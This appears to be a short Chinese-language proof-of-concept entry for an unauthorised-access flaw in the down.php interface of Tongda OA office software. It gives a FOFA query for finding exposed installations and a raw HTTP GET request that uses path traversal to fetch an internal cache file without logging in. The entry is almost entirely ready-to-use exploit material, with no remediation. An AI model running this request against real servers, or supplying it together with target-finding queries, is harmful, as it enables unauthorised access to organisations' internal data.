
## 通达OA down.php接口存在未授权访问漏洞

## fofa
```
app="TDXK-通达OA"
```

## poc

```
http://127.0.0.1/inc/package/down.php?id=../../../cache/org

GET /inc/package/down.php?id=../../../cache/org HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```
